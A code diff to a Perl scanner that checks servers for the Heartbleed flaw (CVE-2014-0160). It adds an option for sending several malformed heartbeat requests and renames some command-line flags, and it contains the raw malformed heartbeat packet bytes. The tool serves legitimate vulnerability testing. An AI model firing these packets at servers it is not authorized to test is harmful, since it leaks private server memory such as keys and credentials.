@@ -10,6 +10,7 @@ use IO::Socket;
 my $starttls = sub {1};
 my $starttls_arg;
 my $timeout = 5;
+my $heartbeats = 1;
 my %starttls = (
     'smtp' => \&smtp_starttls,
     'http' => \&http_connect,
@@ -25,8 +26,9 @@ Check if server is vulnerable against heartbleet SSL attack (CVE-2014-0160)
 Usage: $0 [ --starttls proto[:arg] ] [ --timeout T ] host:port
   --starttls proto[:arg] - start plain and upgrade to SSL with
 			   starttls protocol (imap,smtp,http,pop)
-  --timeout T            - use timeout (default 5)
-  --help|-h              - this screen
+  -T|--timeout T         - use timeout (default 5)
+  -H|--heartbeats N      - number of heartbeats (default 1)
+  -h|--help              - this screen
 
 Examples:
   # check direct www, imaps .. server
@@ -53,8 +55,9 @@ USAGE
 
 GetOptions(
     'h|help' => sub { usage() },
-    '--timeout=i' => \$timeout,
-    '--starttls=s' => sub {
+    'T|timeout=i' => \$timeout,
+    'H|heartbeats=i' => \$heartbeats,
+    'starttls=s' => sub {
 	(my $proto,$starttls_arg) = $_[1] =~m{^(\w+)(?::(.*))?$};
 	usage("invalid starttls protocol $_[1]") if ! $proto
 	    or not $starttls = $starttls{$proto};
@@ -90,7 +93,10 @@ while (1) {
 }
 # heartbeat request with wrong size
 # taken from http://s3.jspenguin.org/ssltest.py
-print $cl pack("H*",join('',qw(18 03 02 00 03 01 40 00)));
+for(1..$heartbeats) {
+    warn "...send heartbeat#$_\n";
+    print $cl pack("H*",join('',qw(18 03 02 00 03 01 40 00)));
+}
 if ( my ($type,$ver,$buf) = _readframe($cl)) {
     if ( $type == 21 ) {
 	warn "received alert (probably not vulnerable)\n";
